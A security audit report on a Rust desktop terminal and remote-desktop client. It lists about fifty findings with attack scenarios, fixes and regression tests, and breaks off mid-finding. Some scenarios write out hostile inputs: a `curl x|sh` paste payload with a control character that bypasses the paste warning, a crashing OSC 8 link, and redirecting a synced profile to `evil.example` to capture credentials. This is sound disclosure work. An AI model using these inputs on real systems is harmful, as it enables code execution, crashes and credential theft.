# Security Audit Report

Nexus Terminal 3.0.1 (`master` at `b6a7d51` when the audit started, `c8ab4d6` after the fixes). Audit started 2026-10-12 22:01 local time.

## 1. Executive Summary

Nexus Terminal is a native desktop client (Rust, egui) for SSH/SFTP, Telnet, RAW TCP, Serial, VNC, RDP, IRC, GitHub and local shells. It has no server side apart from a small PHP update-manifest endpoint. Every remote peer is untrusted. So are the sync folder and any imported file.

The posture going in was reasonable: host keys are checked before authentication, secrets go to the OS keychain or an Argon2id + AES-256-GCM vault, parsers have size caps, there is no `unsafe` outside tests, process hardening is on in release builds, and SQL is parameterised. This review found that the newest features (profile sync, inline images, RDP devices and clipboard, SSH certificate authorities) and some older parsers still had remotely triggerable denial-of-service paths and trust gaps.

**Highest-risk issues (all fixed in this run):**

- **Remote, zero-click whole-app crash.** Hovering any link that has a multi-byte character at byte 7 or 8 panicked the UI thread (SEC-001).
- **Remote memory exhaustion.** A VNC zlib bomb (SEC-002) and RDP desktop sizes allocated before validation (SEC-012) could take the whole app down. Abort-on-OOM is not caught by the per-session panic guard.
- **Remote UI freezes.** One hostile IRC line froze the app for minutes through quadratic OSC stripping (SEC-003). A crafted `@cert-authority` pattern in an imported known_hosts overflowed the stack on every SSH handshake (SEC-004).
- **Profile sync trusted remote timestamps.** A future-dated record or tombstone won over every local correction indefinitely (SEC-005). Combined with credentials keyed by profile id, a sync peer could redirect an existing profile and receive its saved password or token without a prompt (SEC-006).
- **Silent RDP clipboard exfiltration.** The local clipboard was offered to the server whenever the desktop gained focus (SEC-007).
- **Jump hosts could use the forwarded agent.** Agent-forwarding and remote-forward channels were honoured on every hop, not just the target (SEC-008).

**Still open (architectural):**

- Unsigned update manifest and release artefacts (signing deferred by the owner).
- The RDP "Allow servers without NLA" option permits an NLA→TLS downgrade that hands the password to a trust-on-first-use peer.
- Login-script `send` values are plaintext in the profile model, and therefore in the DB, exports and the sync file.
- A sync peer that holds the shared password can still change security-relevant fields (login scripts, host-key policy, agent forwarding, RDP shared folder, forwards).

## 2. Scope Reviewed

- **Languages:** Rust 1.99 (edition 2024), PHP (`updates/index.php`), Bash (release and packaging), GitHub Actions YAML, LaTeX (docs only).
- **Crates:**
  - `rust/core`: protocol clients, sessions, storage, secrets, sync, import/export, validation, updater.
  - `rust/app`: egui UI, terminal emulator glue, OSC handling, CLI.
  - `rust/fuzz`: five targets.
  - Vendored `picky`, `sspi`, `ironrdp-session`, `ironrdp-mstsgu`: diffed against the cargo-verified registry copies.
- **Key dependencies:** russh 0.64.1 / ssh-key 0.7.0-rc.11 / rsa 0.10.0-rc.18, IronRDP 0.17, rustls 0.23 (ring), alacritty_terminal 0.26, egui/eframe 0.36, rusqlite 0.37 (bundled SQLite), keyring 3, argon2 0.5, aes-gcm 0.10, ureq 3, image 0.25.
- **Config and deployment:** `.github/workflows/{ci,fuzz,release-builds}.yml`, `release.sh`, `rust/release.sh`, `rust/packaging/**`, `.gitignore`, `rust/.cargo/audit.toml`, migrations 001–008 (009 added).
- **Tests:** `core/tests/{sessions,ssh_integration,sync}.rs`, and the unit tests in every module.
- **Not present:** containers, IaC, a web frontend (the UI is native egui; there is no HTML/JS).

## 3. Methodology

- Git safety first: the repository existed; the working tree had only the in-progress 3.0.1 docs, which were committed separately beforehand (`b6a7d51`).
- Attack-surface mapping by trust boundary, then seven parallel deep reviews:
  - secrets and crypto;
  - SSH/SFTP/proxies;
  - RDP plus the vendored patches;
  - VNC/Telnet/RAW/Serial/local;
  - IRC/GitHub/updater/PHP;
  - terminal/UI/CLI;
  - storage/model/supply chain.
- Every reported finding was re-verified against the code before fixing. Two were confirmed as false positives (see §21).
- Measurements: the IRC OSC loop was benchmarked with a verbatim copy (64 KiB → 1.8 s, 256 KiB → 27 s, 1 MiB did not finish in 300 s). The CA glob was reproduced (200 000 `*` → stack overflow; `*a*a*…b` → 6.2 s). The VNC inflate bomb was reproduced (509 KiB → 512 MiB, 1.05 GiB RSS).
- Dependency review: `cargo audit` on both lockfiles; `cargo tree -d`; action SHAs verified via the GitHub API; vendored crates diffed.
- Git history scanned for key material. All hits are upstream test fixtures in vendored crates, or detection strings in `keyfiles.rs`.
- Every fix landed with a regression test and was gated on `cargo fmt --check`, `cargo clippy --all-targets -D warnings` and `cargo test --workspace`.
- Smoke test: the release binary opened a real schema-8 data directory, migrated it to 9 and ran a local shell.

## 4. Risk Rating Method

- **Severity** = impact × reachability for this product. A desktop client's worst outcomes are code execution on the user's machine, credential disclosure, or loss of all open sessions.
  - **High:** remote, no or trivial user interaction, crashes or freezes the whole app, or discloses credentials.
  - **Medium:** remote with a precondition (a hostile server the user chose to connect to, a sync peer, an imported file), or local data exposure.
  - **Low:** needs local access or an unusual configuration, or is defence in depth.
- **Confidence:** High = reproduced or unambiguous in code; Medium = depends on runtime or platform behaviour; Low = plausible, unverified.

## 5. Attack Surface Map

| Boundary | Entry points | Attacker position |
|---|---|---|
| Remote terminal bytes | VT parser (alacritty), OSC 7/8/52/133/1337 scanner (`app/src/osc.rs`), URL detection, trigger regexes, recordings | Any SSH/Telnet/RAW/Serial peer, MITM on Telnet/RAW |
| Protocol parsers | SSH (russh), SFTP listings, SOCKS5/HTTP CONNECT replies, Telnet IAC, VNC RFB + encodings, RDP (IronRDP) + RDPDR/CLIPRDR/RDPSND, IRC lines/CAP/SASL, GitHub JSON, update manifest | Hostile server, hostile proxy, MITM where unencrypted |
| Device redirection | RDP shared folder, printer spool, clipboard | Hostile RDP server |
| Shared folder | `nexus-profiles.nexus` sync file | Another machine in the sync group, anyone with write access plus the sync password |
| Imported files | `.nexus`, JSON, `~/.ssh/config`, `known_hosts`, `.cast` | Whoever supplied the file |
| Local | Data dir (`nexus.db`, vault, recordings, log), keychain, argv/env, temp files in shared folders | Same-user malware, other local users, backups |
| Build/release | GitHub Actions, vendored crates, dixon.cx download/update host | Compromised dependency, compromised host |

Data stores: SQLite (`nexus.db`: profiles, known hosts, snippets, preferences, audit log, IRC state), `vault/vault.json`, OS keychain (service `NexusTerminal`), recordings (`.cast`), `nexus.log`, `triggers.json`, `sftp-bookmarks.json`.

## 6. Findings Summary Table

| ID | Severity | Confidence | Title | Component | Status |
|---|---|---|---|---|---|
| SEC-001 | High | High | Hovering a non-ASCII link panics the UI thread | `app/src/widgets.rs` `is_web_url` | Fixed `d6f8f33` |
| SEC-002 | High | High | VNC ZRLE/Tight zlib inflation unbounded (OOM) | `core/src/clients/vnc.rs` `inflate` | Fixed `00f110f` |
| SEC-003 | High | High | Quadratic OSC stripping freezes the UI on one IRC line | `core/src/ircformat.rs` | Fixed `7f3704e` |
| SEC-004 | Medium | High | Recursive CA host-pattern glob: stack overflow / exponential time | `core/src/known_hosts.rs` `glob` | Fixed `0bcfe64` |
| SEC-005 | High | High | Sync trusts remote timestamps: future-dated records win forever | `core/src/sync.rs` `merge` | Fixed `76bd664` |
| SEC-006 | Medium | High | Synced/imported profile can be retargeted and receive saved credentials | `core/src/service.rs` sync/import | Fixed `c8ab4d6` |
| SEC-007 | Medium | High | RDP offers the local clipboard on every focus | `app/src/desktop_view.rs` | Fixed `eb8f08a` |
| SEC-008 | Medium | High | Agent-forward / remote-forward channels honoured from jump hosts | `core/src/clients/ssh.rs` `Handler` | Fixed `0bcfe64` |
| SEC-009 | Medium | High | `write_private` temp file predictable and not O_EXCL | `core/src/secrets.rs` | Fixed `76bd664` |
| SEC-010 | Medium | Medium-High | Paste confirmation bypassed by control characters (C-o, C-d, ESC) | `app/src/terminal.rs` `paste` | Fixed `d6f8f33` |
| SEC-011 | Medium | High | Inline images decoded before the size budget is checked | `app/src/terminal.rs` `place_image` | Fixed `d6f8f33` |
| SEC-012 | Medium | Medium | RDP desktop size allocated before validation (abort) | `core/src/clients/rdp.rs` `run` | Fixed `eb8f08a` |
| SEC-013 | Medium | High | RDP drive reads allocate a server-chosen u32 length | `core/src/clients/rdp_devices.rs` | Fixed `eb8f08a` |
| SEC-014 | Medium | High | IRC passwords (PASS/SASL/NickServ) sent over plaintext | `core/src/clients/irc.rs` | Fixed `7f3704e` |
| SEC-015 | Medium | High | Telnet/RAW writes block forever under the stream lock (UI wedge, unclosable tab) | `core/src/clients/mod.rs` `TcpConn` | Fixed `00f110f`, race fixed `7f3704e` |
| SEC-016 | Medium | High | Non-transactional table-rebuild migrations can brick the DB | `core/src/storage.rs` `migrate` | Fixed `13ca82a` |
| SEC-017 | Medium | High | Release workflow: build scripts run with a persisted `contents: write` token | `.github/workflows/release-builds.yml` | Fixed `400d11e` |
| SEC-018 | Medium | High | Update manifest and release artefacts unsigned | `core/src/updater.rs`, release pipeline | Open (signing deferred by owner); SHA256SUMS now published |
| SEC-019 | Medium | High | RDP "Allow servers without NLA" permits NLA→TLS downgrade | `core/src/clients/rdp.rs` | Open |
| SEC-020 | Medium | High | Login-script passwords plaintext in DB, exports and the sync file | `core/src/models.rs` `LoginScriptStep` | Open (documented honestly in `76bd664`) |
| SEC-021 | Medium | Medium | Sync peer can change security-relevant profile fields silently | `core/src/sync.rs`, `service.rs` | Open (credential part fixed by SEC-006) |
| SEC-022 | Medium | Medium | Remote clipboard toast showed only the first line (spoofable) | `app/src/app.rs` | Fixed `d6f8f33` (default still allows writes) |
| SEC-023 | Low | High | Remote forwards bound to `0.0.0.0` by default | `core/src/clients/ssh.rs` | Fixed `0bcfe64` |
| SEC-024 | Low | High | Known-host lookup ignores key type (false "changed key" after import) | `core/src/storage.rs` | Fixed `0bcfe64` |
| SEC-025 | Low | High | Keyboard-interactive unbounded rounds; no timeouts on jump dials / `run_command` | `core/src/clients/ssh.rs` | Fixed `0bcfe64` |
| SEC-026 | Low | High | Handshake timeout shorter than the host-key prompt | `core/src/clients/ssh.rs` | Fixed `0bcfe64` |
| SEC-027 | Low | Medium | SFTP save dialog prefilled with an unsanitised server filename | `app/src/sftp.rs` | Fixed `0bcfe64` |
| SEC-028 | Low | High | IRC self-JOIN / CAP LS state growth | `core/src/clients/irc.rs` | Fixed `7f3704e` |
| SEC-029 | Low | High | Telnet replies to every DONT/WONT (ping-pong, amplification); NAWS 0xFF unescaped | `core/src/clients/telnet.rs` | Fixed `00f110f` |
| SEC-030 | Low | High | VNC close/input starved by a continuously streaming server | `core/src/clients/vnc.rs` `Conn` | Fixed `00f110f` |
| SEC-031 | Low | High | Local shell panics on non-UTF-8 environment entries | `core/src/clients/local.rs` | Fixed `00f110f` |
| SEC-032 | Low | High | Print jobs truncate each other; unbounded open jobs | `core/src/clients/rdp_devices.rs` | Fixed `eb8f08a` |
| SEC-033 | Low | High | Secret reads returned plain `String`s; sync password fetched every frame | `core/src/secrets.rs`, `service.rs` | Fixed `76bd664`; UI buffers still open |
| SEC-034 | Low | High | Legacy Go-era `proxyPassword`/`totpSecret` left in `ssh_config` JSON | DB | Fixed `13ca82a` (migration 009 + VACUUM) |
| SEC-035 | Low | High | `nexus.db` / WAL created with default mode; no `secure_delete` | `core/src/storage.rs` | Fixed `13ca82a` |
| SEC-036 | Low | High | Profile id free text used as the keychain key namespace | `core/src/validation.rs` | Fixed `13ca82a` |
| SEC-037 | Low | High | Hosts admitted NUL/control characters; jump/forward hosts unvalidated | `core/src/validation.rs` | Fixed `13ca82a` |
| SEC-038 | Low | High | `--answer` puts secrets on argv and answers any prompt | `app/src/main.rs` | Fixed `c8ab4d6` (needs `--screenshot`) |
| SEC-039 | Low | High | Toast queue unbounded (trigger/OSC 52 floods) | `app/src/state.rs` | Fixed `d6f8f33` |
| SEC-040 | Low | High | `~/.ssh` created with the default mode by key generation | `core/src/clients/ssh.rs` | Fixed `76bd664` |
| SEC-041 | Low | High | `updates/index.php` TypeErrors on array parameters | `updates/index.php` | Fixed `400d11e` |
| SEC-042 | Low | High | CI tooling unpinned; fuzz lockfile unaudited; no fuzz timeout | workflows | Fixed `400d11e` |
| SEC-043 | Low | High | RUSTSEC-2023-0071 `rsa` Marvin (via russh) | `Cargo.lock` | Open (no upstream fix; ignored with reason) |
| SEC-044 | Low | High | Event channel to the UI unbounded while the UI thread is blocked | `app/src/app.rs` | Open |
| SEC-045 | Low | High | Serial write/break hold the port lock on the UI thread | `core/src/clients/serial.rs` | Open |
| SEC-046 | Low | Medium | Kerberos KDC always dialled directly (bypasses proxy/tunnel) | `core/src/clients/rdp.rs` | Open (documented) |
| SEC-047 | Low | High | RDP: SVC chunk reassembly unbounded (upstream ironrdp-svc) | dependency | Open (upstream) |
| SEC-048 | Low | High | Keychain entries global per OS user, not per data dir | `core/src/secrets.rs` | Open (accepted; compatibility) |
| SEC-049 | Info | High | Vault entries not bound to their key name (no AAD); version byte unauthenticated | `core/src/secrets.rs`, `exportimport.rs` | Open (hardening for next format bump) |
| SEC-050 | Info | High | Verified-absent classes (see §7.50) | workspace | Clean |

## 7. Detailed Findings

Each finding has the 14 headings the format calls for. Where a heading would only restate the summary table it is folded into one line, to keep this document reviewable.

### Finding ID: SEC-001

#### Title
Hovering a link with a multi-byte character at byte 7/8 panics the UI thread

#### Severity
High

#### Confidence
High (reproduced with a verbatim copy)

#### Affected Files / Components
`rust/app/src/widgets.rs` `is_web_url` (was lines 131-134). Callers: `terminal.rs` OSC 8 hover tooltip, Cmd-hover URL detection, `open_web_url`, `github_view.rs`, `settings.rs` (update link).

#### Description
`&u[..8]` slices a `str` at a byte offset. If that offset falls inside a multi-byte character, Rust panics. The panic unwinds out of `App::ui`, and nothing catches it.

#### Evidence
```rust
(u.len() > 8 && u[..8].eq_ignore_ascii_case("https://")) || (u.len() > 7 && u[..7]...)
```

#### Attack Scenario
A server prints `printf '\e]8;;mailto:ü@x\e\\docs\e]8;;\e\\'` or `echo http://über.example`. The user moves the mouse over it, and the process exits with every session.

#### Impact
Remote denial of service for the whole app. Shutdown cleanup (session close, vault lock) is skipped.

#### Recommendation
Compare bytes (`as_bytes()` plus `eq_ignore_ascii_case` on slices).

#### Safer Example
```rust
let u = url.trim().as_bytes();
let starts = |p: &[u8]| u.len() > p.len() && u[..p.len()].eq_ignore_ascii_case(p);
starts(b"https://") || starts(b"http://")
```

#### Suggested Tests
Added to `only_web_urls_are_opened`: `http://über.example/` (ok), `mailto:ü@x`, `http:/üüü`, `ftp://é` (refused, no panic).

#### References
CWE-248 (uncaught exception), CWE-135.

#### Assumptions / Limitations
None.

### Finding ID: SEC-002

#### Title
VNC ZRLE/Tight zlib inflation has no output bound

#### Severity
High

#### Confidence
High (reproduced: 509 KiB → 512 MiB, 1.05 GiB RSS)

#### Affected Files / Components
`rust/core/src/clients/vnc.rs` `inflate`, ZRLE and Tight callers.

#### Description
Input was capped (64 MiB ZRLE, 4 MiB Tight), but output was not. The Vec doubled until allocation failure, which aborts the process rather than panicking, so the per-session guard can't contain it.

#### Evidence
`out.reserve(64 << 10)` inside an unbounded loop.

#### Attack Scenario
Any VNC server the user connects to, or a MITM on direct VNC, sends one ZRLE rectangle containing a sync-flushed zlib stream of zeros.

#### Impact
The OOM killer takes the whole app.

#### Recommendation
Cap inflation at the rectangle's maximum legitimate size and release large scratch buffers.

#### Safer Example
`inflate(z, input, out, max_inflated(w, h))`, where `max_inflated = w*h*4 + tiles*(1+128*4)`; Tight uses its exact `size`.

#### Suggested Tests
`inflate_refuses_zlib_bombs` (64 MiB of zeros for a 4×4 rect is refused and capacity stays < 1 MiB; a legitimate rect still inflates).

#### References
CWE-409 (decompression bomb), CWE-789.

#### Assumptions / Limitations
The VNC fuzz target is unlikely to find this unaided. Seed its corpus with valid zlib streams.

### Finding ID: SEC-003

#### Title
Quadratic OSC stripping in `ircformat` freezes the UI

#### Severity
High

#### Confidence
High (measured)

#### Affected Files / Components
`rust/core/src/ircformat.rs` `strip_terminal_escapes`, run on the UI thread from `IrcView::append`.

#### Description
For an unterminated `ESC ]`, the loop advanced two bytes and rescanned the rest twice (`find` and `rfind`).

#### Evidence
`None => { s.push_str(&rest[..pos + 2]); rest = body; }`

#### Attack Scenario
The server, or a MITM on plaintext IRC, sends a PRIVMSG made of `"\x1b]"` repeated. Lines were allowed up to 1 MiB.

#### Impact
Whole-app freeze for minutes per line.

#### Recommendation
If no terminator follows an OSC, none can follow a later one either, so stop. Separately, cap IRC lines at a realistic size.

#### Safer Example
`None => break,`; `MAX_LINE_BYTES = 64 << 10`.

#### Suggested Tests
`unterminated_osc_runs_are_linear` (500 000 repetitions in under 2 s). The fuzz workflow now passes `-timeout=10`.

#### References
CWE-407 (algorithmic complexity), CWE-1333.

#### Assumptions / Limitations
None.

### Finding ID: SEC-004

#### Title
CA host-pattern glob: stack overflow and exponential backtracking on every SSH handshake

#### Severity
Medium

#### Confidence
High (reproduced)

#### Affected Files / Components
`rust/core/src/known_hosts.rs` `glob` / `pattern_matches` / `authorities_for`, called from `ssh.rs` `handshake` on every hop. Patterns enter through known_hosts import and Trust a CA.

#### Description
A recursive, backtracking matcher with no length limit.

#### Evidence
Recursive `glob(&p[1..], s) || glob(p, &s[1..])`.

#### Attack Scenario
A shared `known_hosts` containing `@cert-authority ***…(200k) <key>` is imported once. From then on every SSH connect overflows the 2 MiB connect-thread stack (the process aborts), or burns CPU for minutes with `*a*a*…b`.

#### Impact
Persistent, total loss of SSH until the row is removed.

#### Recommendation
Use an iterative two-pointer wildcard match, and cap pattern length at 1 KiB on import and on Trust a CA.

#### Safer Example
See the new `glob` in `known_hosts.rs`.

#### Suggested Tests
`hostile_patterns_match_in_linear_time` (runs on a 256 KiB stack; also covers semantics).

#### References
CWE-674, CWE-1333.

#### Assumptions / Limitations
None.

### Finding ID: SEC-005

#### Title
Profile sync trusts remote timestamps; a future-dated record or tombstone wins indefinitely

#### Severity
High (precondition: write access to the shared folder plus the sync password)

#### Confidence
High

#### Affected Files / Components
`rust/core/src/sync.rs` `merge`; `service.rs` `sync_profiles`, which runs every 10 minutes and 3 s after any edit.

#### Description
`updated_at` and tombstone times from the shared file were compared raw. A record dated 2099 beats every later local edit. A tombstone dated 2099 keeps deleting a re-created profile and its saved credentials.

#### Evidence
`if r.updated_at > l.updated_at { … }` and `deleted.get(id).is_some_and(|t| *t >= winner.updated_at)`.

#### Attack Scenario
One compromised machine in the sync group, or someone who brute-forces a weak sync password offline, writes a file with a forged profile dated in the future.

#### Impact
A persistent, user-unfixable profile takeover, or fleet-wide deletion of profiles and credentials.

#### Recommendation
Clip remote times to the local clock, and let an edit win a tie with a deletion.

#### Safer Example
`p.updated_at = p.updated_at.min(now)`, tombstones `.min(now)`, deletion only if `t > winner.updated_at`.

#### Suggested Tests
`future_dated_records_cannot_win_forever`.

#### References
CWE-345 (insufficient verification of data authenticity), CWE-367.

#### Assumptions / Limitations
A peer with the password can still make ordinary, current-dated edits. See SEC-006 and SEC-021.

### Finding ID: SEC-006

#### Title
A synced or imported profile can be retargeted and receive the saved credentials of the profile it replaces

#### Severity
Medium

#### Confidence
High

#### Affected Files / Components
`rust/core/src/service.rs` `sync_profiles` and `import` ("overwrite"); credentials are keyed `profile:<id>:<kind>`.

#### Description
An incoming profile with the same id but a different host, user, GitHub API URL, gateway or jump host inherited the local saved password or token. In `Saved` mode it was sent without a prompt.

#### Evidence
`update_profile(&p)` with no comparison against the old target.

#### Attack Scenario
A sync peer changes the "Prod DB" profile's host to `evil.example`, or a GitHub profile's `baseURL` to `https://evil.example/api/v3`. The next connect sends the saved credential to the attacker. The host-key prompt shows the new host, but the sidebar name is unchanged, and GitHub has no prompt at all.

#### Impact
Credential disclosure.

#### Recommendation
When a sync or import changes the connection target, forget that profile's saved credentials (audited) so the user is asked again.

#### Safer Example
`forget_credentials_if_retargeted(old, new, via)` in `service.rs`.

#### Suggested Tests
`core/tests/sync.rs` now asserts that A's saved password is gone after B repoints the host.

#### References
CWE-522, CWE-441 (confused deputy).

#### Assumptions / Limitations
Edits in the local editor keep credentials, which is deliberate: renaming a server is normal.

### Finding ID: SEC-007

#### Title
RDP offered the local clipboard to the server whenever the desktop gained focus

#### Severity
Medium

#### Confidence
High

#### Affected Files / Components
`rust/app/src/desktop_view.rs` `draw`; `core/src/clients/rdp.rs` `TextClipboard`.

#### Description
Focusing the desktop announced CF_UNICODETEXT, and any Format Data Request returned the clipboard. The outbound direction had no preference gate.

#### Evidence
`if focused && !self.had_focus … c.set_clipboard(text)`

#### Attack Scenario
The user copies a password from a password manager, then clicks into an RDP tab. The server reads it.

#### Impact
Silent clipboard exfiltration.

#### Recommendation
Share only on an explicit paste (Ctrl/Cmd+V or Paste Clipboard).

#### Safer Example
The focus-time block was removed; `Event::Paste` still calls `paste()` before the keystroke.

#### Suggested Tests
View-level focus test not added (egui harness limits); covered by code review. The paste path is unchanged.

#### References
CWE-200, CWE-359.

#### Assumptions / Limitations
None.

### Finding ID: SEC-008

#### Title
Agent-forward and remote-forward channels accepted from jump hosts

#### Severity
Medium

#### Confidence
High

#### Affected Files / Components
`rust/core/src/clients/ssh.rs` `Handler::server_channel_open_agent_forward` / `server_channel_open_forwarded_tcpip`. State lived on `Shared`, which is common to all hops.

#### Description
Once agent forwarding was enabled for the target, any hop's server could open `auth-agent@openssh.com` and sign with the user's keys. Any hop could also open `forwarded-tcpip` to configured remote-forward destinations on the client machine.

#### Evidence
`let handler = Handler { …, shared: self.shared.clone(), cas }` for every hop.

#### Attack Scenario
An untrusted bastion in `jump_hosts`, with agent forwarding on for the target.

#### Impact
Authentication as the user wherever the agent's keys are trusted; access to local services behind remote forwards.

#### Recommendation
A per-hop `target` flag; only the final hop may open these channels (the same behaviour as `ssh -J`).

#### Safer Example
`if !self.target || !agent_forwarding { reject }`

#### Suggested Tests
Recommended: a two-sshd integration test in which an agent channel opened from the jump host is refused. Not added in this run because CI lacks a second sshd fixture.

#### References
CWE-284, CWE-441.

#### Assumptions / Limitations
None.

### Finding ID: SEC-009

#### Title
`write_private` temp file was predictable and not created exclusively

#### Severity
Medium

#### Confidence
High

#### Affected Files / Components
`rust/core/src/secrets.rs` `write_private` (vault, exports, sync file, JSON exports).

#### Description
The temp name was `.<name>.tmp-<pid>`, opened with `create(true).truncate(true)`. That follows a pre-placed symlink, and the 0600 mode is ignored for an existing file.

#### Attack Scenario
In a shared sync folder, another user plants a symlink at the predictable name. The next sync clobbers the symlink's target, and the rename then swaps the symlink in.

#### Impact
Arbitrary file overwrite with the victim's permissions; ciphertext may land in a readable file.

#### Recommendation
`create_new(true)` with a random 64-bit suffix, retried on `AlreadyExists`.

#### Suggested Tests
`write_private_never_follows_links_or_leaves_temp_files`.

#### References
CWE-377, CWE-59.

#### Assumptions / Limitations
Windows has no symlink equivalent for unprivileged users by default.

### Finding ID: SEC-010

#### Title
Multi-line paste confirmation bypassed by other control characters

#### Severity
Medium

#### Confidence
Medium-High (depends on shell keybindings)

#### Affected Files / Components
`rust/app/src/terminal.rs` `paste`; `chrome.rs` ConfirmPaste preview.

#### Description
Only `\n`/`\r` triggered the dialog. Outside bracketed paste, `0x0F` (readline `operate-and-get-next`) runs the line, `0x04` exits, and `ESC…` drives macros.

#### Attack Scenario
A web page's copy text is `curl x|sh\x0f`; the user pastes it into a shell without bracketed paste.

#### Impact
Command execution without the warning the user relies on.

#### Recommendation
Require confirmation for any control character except tab, and show control characters escaped in the preview.

#### Suggested Tests
Extended `remote_clipboard_and_multiline_paste_go_to_the_app`.

#### References
CWE-150, CWE-451.

#### Assumptions / Limitations
Bracketed paste was already safe: ESC is stripped and no prompt is needed.

### Finding ID: SEC-011

#### Title
Inline images decoded before the per-terminal budget was enforced

#### Severity
Medium

#### Confidence
High

#### Affected Files / Components
`rust/app/src/terminal.rs` `place_image`.

#### Description
The decoder accepted 8192² images (67 Mpx, about 256 MiB). The decode ran synchronously on the UI thread, then the eviction loop kept the new image even though it alone exceeded the 32 Mpx budget. A solid-colour 8192² PNG is about 100 KB on the wire.

#### Recommendation
Read dimensions from the header first, refuse anything over `MAX_IMAGE_PIXELS`, and set `max_alloc` to match.

#### Suggested Tests
`oversized_inline_images_are_refused_before_decoding`.

#### References
CWE-400, CWE-789.

#### Assumptions / Limitations
Decoding still happens on the UI thread. Moving it to a worker is a next step.

### Finding ID: SEC-012

#### Title
RDP desktop size allocated before validation

#### Severity
Medium

#### Confidence
Medium (outcome depends on overcommit)

#### Affected Files / Components
`rust/core/src/clients/rdp.rs` `run` (connect and reactivation).

#### Description
`DecodedImage::new(w, h)` (up to 16 GiB) ran before `Framebuffer::new_checked`'s 64 Mpx cap.

#### Recommendation
Swap the order. Done in both places.

#### Suggested Tests
Recommended: a fake connector result with 65535×65535 returns an error. The order change was verified by reading the code.

#### References
CWE-789.

#### Assumptions / Limitations
None.

### Finding ID: SEC-013

#### Title
RDP drive read length taken from the server

#### Severity
Medium

#### Confidence
High

#### Affected Files / Components
`rust/core/src/clients/rdp_devices.rs` `ConfinedDrive::handle`. Upstream `ironrdp-rdpdr-native` allocates `vec![0; length]`.

#### Description
`DeviceReadRequest.length` (u32) was passed through, so each request could allocate 4 GiB.

#### Recommendation
Clamp to 8 MiB; a short read is valid RDPDR.

#### Suggested Tests
Recommended: a unit test on the clamp.

#### References
CWE-789.

#### Assumptions / Limitations
Only reachable when a shared folder is configured.

### Finding ID: SEC-014

#### Title
IRC passwords sent over plaintext connections

#### Severity
Medium

#### Confidence
High

#### Affected Files / Components
`rust/core/src/clients/irc.rs` (`run` PASS, `handle_cap` SASL, `identify_with_nickserv`).

#### Recommendation
Send them only over TLS, an SSH tunnel or a loopback server; otherwise emit an error event explaining why.

#### Suggested Tests
`credentials_need_tls_a_tunnel_or_loopback`. The existing SASL test still passes over loopback.

#### References
CWE-319.

#### Assumptions / Limitations
This is a behaviour change: plaintext networks that require a password now refuse to log in until TLS or a tunnel is used.

### Finding ID: SEC-015

#### Title
Telnet/RAW writes could block forever under the stream lock

#### Severity
Medium

#### Confidence
High

#### Affected Files / Components
`rust/core/src/clients/mod.rs` `TcpConn`.

#### Description
There was no write timeout, and `close()` needed the same lock. A peer that stops reading while flooding negotiation requests made the reader thread block in `write_all`, wedging the UI's next keystroke and the tab close.

#### Recommendation
A 10 s write timeout; a second socket handle to shut down without the lock; a `closing` flag so the reader doesn't report our own close.

#### Suggested Tests
Existing close tests, stress-run 15×.

#### References
CWE-833, CWE-400.

#### Assumptions / Limitations
`00f110f` briefly introduced a close race (a spurious "read error"), caught by the existing test and fixed in `7f3704e`.

### Finding ID: SEC-016

#### Title
Non-transactional table-rebuild migrations

#### Severity
Medium

#### Confidence
High

#### Affected Files / Components
`rust/core/src/storage.rs` `migrate`; migrations 002/004/005/007/008.

#### Description
`execute_batch` ran each statement in autocommit. A crash between `DROP TABLE profiles` and the rename left a database that failed on every launch.

#### Recommendation
One transaction per migration.

#### Suggested Tests
`a_failed_migration_rolls_back_and_legacy_secrets_are_purged`.

#### References
CWE-662.

#### Assumptions / Limitations
None.

### Finding ID: SEC-017

#### Title
Release workflow ran dependency code with a persisted write token

#### Severity
Medium

#### Confidence
High

#### Affected Files / Components
`.github/workflows/release-builds.yml`.

#### Recommendation
Build jobs get `contents: read` and `persist-credentials: false`. A separate publish job (no project code) uploads the artefacts plus a new `SHA256SUMS`.

#### References
CWE-269; OpenSSF Scorecard "Token-Permissions".

#### Assumptions / Limitations
Releases now wait for all platforms to build.

### Finding ID: SEC-018

#### Title
Update manifest and binaries unsigned

#### Severity
Medium

#### Confidence
High

#### Affected Files / Components
`core/src/updater.rs`, `rust/release.sh`, dixon.cx hosting.

#### Description
The client is check-only (it never downloads or runs anything), uses HTTPS with webpki roots and a 1 MiB cap, never advertises a downgrade, and only opens http(s) links. A compromised dixon.cx could still advertise a trojan "update" link.

#### Recommendation
Sign the manifest (minisign/ed25519, public key embedded) and the artefacts; use `https_only(true)`; cap displayed strings.

#### References
CWE-494, CWE-347.

#### Assumptions / Limitations
The owner deferred signing.

### Finding ID: SEC-019

#### Title
"Allow servers without NLA" permits an NLA→TLS downgrade

#### Severity
Medium

#### Confidence
High

#### Affected Files / Components
`rust/core/src/clients/rdp.rs` (`enable_tls: c.allow_tls_only`, `autologon`).

#### Description
With the option on, a MITM selects SSL-only. CredSSP is skipped, and the password goes in the Client Info PDU to a peer whose certificate is only TOFU-pinned.

#### Recommendation
Remember per known host that NLA succeeded and refuse TLS-only afterwards, and/or only autologon when HYBRID was selected.

#### Suggested Tests
A fake server selecting SSL after a prior HYBRID connection must fail.

#### References
CWE-757 (algorithm downgrade).

#### Assumptions / Limitations
Off by default; the tooltip says "less secure". Left open because it needs a known-hosts schema addition and a UX decision.

### Finding ID: SEC-020

#### Title
Login-script passwords are plaintext profile data

#### Severity
Medium

#### Confidence
High

#### Affected Files / Components
`core/src/models.rs` `LoginScriptStep`; `storage.rs` (`ssh_config`/`telnet_config` JSON); encrypted export; sync file.

#### Recommendation
Resolve `send` steps that follow a password prompt from the secret store at run time (a new `SecretKind`), or support a `{{password}}` placeholder.

#### Assumptions / Limitations
Wording in the UI, the audit log and the docs was corrected in `76bd664`, so the product no longer claims these never sync. `secure_delete` (SEC-035) now removes edited values from free pages.

### Finding ID: SEC-021

#### Title
A sync peer can change security-relevant profile fields silently

#### Severity
Medium

#### Confidence
Medium

#### Affected Files / Components
`sync.rs`, `service.rs` `sync_profiles`, `validation.rs`.

#### Description
Fields a sync peer can change unseen: `login_scripts`, `startup_command`, `host_key_policy` (Insecure), `agent_forwarding`, `port_forwards`, `rdp.shared_folder`. Validation checks shape, not intent.

#### Recommendation
Summarise what changed after a pull and require approval for those fields, or sign sync records per machine (an ed25519 key per install, exchanged once).

#### Assumptions / Limitations
The credential-redirect part is closed by SEC-006.

### Finding ID: SEC-022

#### Title
Remote clipboard toast spoofable

#### Severity
Medium

#### Confidence
High

#### Affected Files / Components
`app/src/app.rs` `remote_clipboard`.

#### Description
The toast showed 60 characters of the first line only.

#### Recommendation
